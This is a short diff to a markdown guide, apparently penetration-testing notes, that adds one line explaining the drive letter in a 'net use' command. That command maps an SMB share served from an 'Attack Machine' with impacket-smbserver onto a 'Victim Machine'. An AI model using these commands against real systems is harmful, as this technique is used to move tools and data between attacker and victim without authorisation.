@@ -23,6 +23,7 @@ sudo impacket-smbserver share -smb2support <directory path to share>
 - Now that the SMB server has been started we need to provided the credentials of the Attack Machine (`username` and `password`) to authenticate the Victim Machine to the SMB server.
 - So provide **username**, **password**, **IP address** of the Attack Machine.
 - You will be prompted to enter password later.
+- Here `n:` is the drive letter you are assigning to the network share, so that it becomes accessible as a virtual drive in your local pc.
 
 ```bash
 net use n: \\<Attack Machine IP>\share /user:<username>
